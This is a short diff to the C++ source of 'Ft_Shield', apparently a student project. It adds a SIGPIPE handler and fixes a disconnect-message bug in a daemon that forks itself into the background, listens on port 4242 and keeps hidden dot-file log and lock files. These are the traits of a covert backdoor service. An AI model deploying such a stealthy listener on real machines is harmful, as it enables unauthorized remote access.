@@ -29,6 +29,15 @@
 #define DAEMON_LOG_FILE "/var/log/.matt_daemon"
 #define DAEMON_LOCK_FILE "/var/lock/.matt_daemon"
 
+/*
+ * SIGPIPE handler:
+ * Ignore broken pipe signal to avoid crash if ft_shield sends a message to
+ * a cliant that is dosconnected
+ */
+void	brokenPipe(int signal __attribute__((unused)))
+{
+	return;
+}
 /* Constructors ============================================================= */
 Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2), _lockFile(-1), _logFile(-1), _nClients(0)
 {
@@ -66,7 +75,7 @@ Ft_Shield::~Ft_Shield(void)
 	this->_buffer = "You've been disconnected.\n";
 	for (int fd = 3; fd <= this->_maxfd; fd++)
 	{
-		send(client, this->_buffer.c_str(), this->_buffer.length(), 0);
+		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 		close(fd);
 	}
 	remove(DAEMON_LOCK_FILE);
@@ -96,7 +105,7 @@ void Ft_Shield::daemonize(void)
 
 	std::cout << "halvarez" << std::endl;
 	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
-
+	std::signal(SIGPIPE, &brokenPipe);
 	/* First fork to detach from the current processus */
 	pid = fork();
 	if (pid == -1)
